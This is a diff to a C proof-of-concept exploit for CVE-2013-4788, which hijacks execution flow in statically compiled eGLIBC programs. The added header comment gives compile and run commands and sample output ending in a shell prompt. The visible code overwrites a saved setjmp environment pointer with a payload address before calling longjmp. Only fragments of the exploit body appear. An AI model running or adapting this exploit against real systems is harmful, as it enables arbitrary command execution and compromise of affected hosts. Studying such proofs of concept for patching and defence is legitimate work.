@@ -1,3 +1,13 @@
+/*
+** CVE-2013-4788 eGLIBC execution flow arbitrary command proof of concept.
+** gcc eglibcongek.c -o eglibcongek -static
+** ./egblibcongek
+** [+] Crotz ...
+** [+] Crotz ...!!
+** $
+**
+** Yabegindang lah, static compiled eglibc emang begitu deh suka ndak kru kruan :|
+**/
 #include <stdio.h>
 #include <setjmp.h>
 #include <stdint.h>
@@ -31,7 +41,6 @@ int main(void){
    }
 
    *p_retenv = spacing((uintptr_t)payload);
-
    longjmp(env, 1);
 
    printf("[-] Failed ...\n");
